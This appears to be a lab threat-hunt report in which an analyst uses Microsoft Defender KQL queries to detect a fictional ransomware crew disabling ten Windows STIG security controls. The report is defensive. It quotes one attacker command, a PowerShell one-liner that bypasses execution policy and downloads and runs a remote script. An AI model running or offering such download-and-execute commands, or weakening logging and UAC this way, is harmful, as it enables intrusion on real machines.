![image](https://github.com/user-attachments/assets/aae438d1-b51f-4691-b49b-e45fa8b044ad)

# Threat Hunt Report: Crimson Mongoose Ransomware Pre-Staging (((DRAFT))) 
- [Scenario Creation](./threat-hunting-scenario-ransomware-pre-staging-activity-event-creation.md)

---

## Platforms and Languages Leveraged
- Windows 10 Virtual Machine (Microsoft Azure)
- EDR Platform: **Microsoft Defender for Endpoint** (Advanced Hunting)
- Kusto Query Language (KQL)
- PowerShell

---

## Scenario

**Alert source:** Regional CERT flash warning of a new ransomware crew, *Crimson Mongoose*.

**Key intel:** In every confirmed intrusion the actors quickly flip **exactly ten Windows 10 STIG controls** that kill logging (PowerShell, audit), weaken UAC, and enable insecure remote protocols (SMB signing, WinRM HTTP, disable FIPS).  
They then lurk ≤ 24 h before detonating an encryptor.

**Goal:** Detect all ten STIG flips on the single lab VM and escalate **before** the 24-hour fuse expires.

### High-Level IOC Discovery Plan

| Table | IOC Focus |
|-------|-----------|
| `DeviceRegistryEvents` | Any of the ten registry paths/values set to non-compliant data. |
| `DeviceProcessEvents` | `reg.exe`, `Set-ItemProperty`, or `auditpol.exe` commands that performed the flips. |
| `DeviceNetworkEvents` | Unsigned SMB or WinRM HTTP (port 5985) traffic that follows the mis-configs. |

---

## Steps Taken

### 1. Checked `DeviceRegistryEvents` for STIG value changes

Simple sweep for any key containing the PowerShell, WinRM, SMB, FIPS, or UAC paths with bad values (`0` or `1` depending on control).  
**Query used:**

```kql
DeviceRegistryEvents
| where Timestamp > ago(24h)
| where ActionType == "RegistryValueSet"  
| where RegistryKey has_any ([...])
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, 
         RegistryValueData, InitiatingProcessAccountName,  
         InitiatingProcessFileName
| order by Timestamp desc
```
Findings: All ten non-compliant values appeared between 2025-06-17 18:03–18:05 UTC.

##

### 2. Checked `DeviceProcessEvents` for who made the changes
Focused on commands containing reg add, Set-ItemProperty, or auditpol.
Query:

```kql
DeviceProcessEvents
| where Timestamp between (datetime(2025-06-17T18:00Z) .. datetime(2025-06-17T18:10Z))
| where ProcessCommandLine has_any ("reg add","Set-ItemProperty","auditpol")
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessAccountUpn
| order by Timestamp desc
```

Findings:
Process owner corp\backupsvc executed one-liner PowerShell:
```
powershell.exe -ep Bypass -NoProfile -c "iwr https://raw.githubusercontent.../stig-pre-staging-iocs.ps1 | iex"
```

This matches attacker TTP: pull-and-run script from GitHub, window hidden.

##

### 3. Searched `DeviceNetworkEvents` for supporting traffic
Hunted for unsigned SMB and WinRM HTTP (5985):

```kql
DeviceNetworkEvents
| where Timestamp > datetime(2025-06-17T18:05Z)
| where (RemotePort == 5985 and Protocol == "Tcp")  
   or (LocalPort == 445 and Protocol == "Tcp")
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName
| order by Timestamp desc
```

### 4. Validation - Confirmed All 10 STIG Controls Modified
Validated that all 10 controls were modified by same account:
```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2025-06-17T18:00Z) .. datetime(2025-06-17T18:10Z))
| where ActionType == "RegistryValueSet"
| where RegistryKey has_any ([list of 10 specific paths])
| summarize 
    ModifiedControls = dcount(RegistryKey),
    ControlsList = make_set(RegistryKey),
    UniqueAccounts = dcount(InitiatingProcessAccountName)
  by DeviceName
| where ModifiedControls == 10
```
Findings: Confirmed all 10 STIG controls were modified by single account (corp\backupsvc) within 2-minute window.

---

### Chronological Event Timeline

| Time (UTC) | Event |
|-------|-----------|
|18:03:12|powershell.exe (hidden) downloaded and executed stig-pre-staging-iocs.ps1.|
|18:03:14–18:05:09|All ten registry values flipped to non-compliant (DeviceRegistryEvents).|
|18:05:22|First WinRM HTTP connection to 10.0.0.15:5985 by powershell.exe.|

| IOC (Type) | Value | Confidence | MITRE ATT&CK
|-------|-----------|-------|-----------|
| Compromised Account | corp\backupsvc | High | T1078
| Malicious Process | powershell.exe -ep Bypass -NoProfile | High | T1059.001
| C2 Server | 10.0.0.15:5985 (WinRM) | Medium | T1021.006
| Malicious Script | stig-pre-staging-iocs.ps1 | High | T1203
| Registry Modifications | 10 STIG controls disabled | High | T1112

---

## Summary
The VM showed the full Crimson Mongoose STIG footprint: ten critical controls disabled by account corp\backupsvc via a single remote-downloaded PowerShell command, followed by WinRM traffic.
This matches pre-staging behavior; ransomware detonation would likely follow within the next 24 hours.

---

### Response Taken
Immediate Actions:

- Isolated device via MDE
- Disabled corp\backupsvc account
- Initiated enterprise-wide hunt for similar activity

---
